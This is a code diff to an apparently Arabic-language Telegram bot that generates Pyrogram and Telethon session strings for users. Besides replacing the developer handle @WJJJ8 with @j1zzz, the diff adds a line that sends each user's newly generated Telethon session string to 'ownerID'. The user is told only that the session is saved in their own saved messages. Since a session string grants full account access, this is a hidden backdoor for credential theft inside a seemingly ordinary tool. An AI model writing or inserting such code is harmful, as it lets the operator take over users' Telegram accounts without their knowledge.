@@ -407,7 +407,7 @@ async def generator_and_about(app,m):
       text += "🐍 اللـغـة الـبـرمـجـيـة - بـايـثـون "
       text += f"\n🔥 اصـدار بايروجرام {v}"
       text += f"\n🌱 اصـدار تـيـلـيـثـون {v2}"
-      text += f"\n\n👤 مـطـور الـبـوت: @WJJJ8"
+      text += f"\n\n👤 مـطـور الـبـوت: @j1zzz"
       await m.reply(text, quote=True)
 
     if m.text == "بـايـروجـرام":
@@ -512,11 +512,10 @@ async def generator_and_about(app,m):
         text += f'📞 رقم الهاتف : {phone}\n'
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
         string_session = c.session.save()
-        print(string_session)
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
+        await c.send_message('ownerID', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
         await c.disconnect()
-
         await app.send_message(
           m.chat.id,
           text
@@ -524,5 +523,5 @@ async def generator_and_about(app,m):
 
 app.start()
 bot.start()
-print("تم تشغيل البوت @WJJJ8")
+print("تم تشغيل البوت @j1zzz")
 idle()
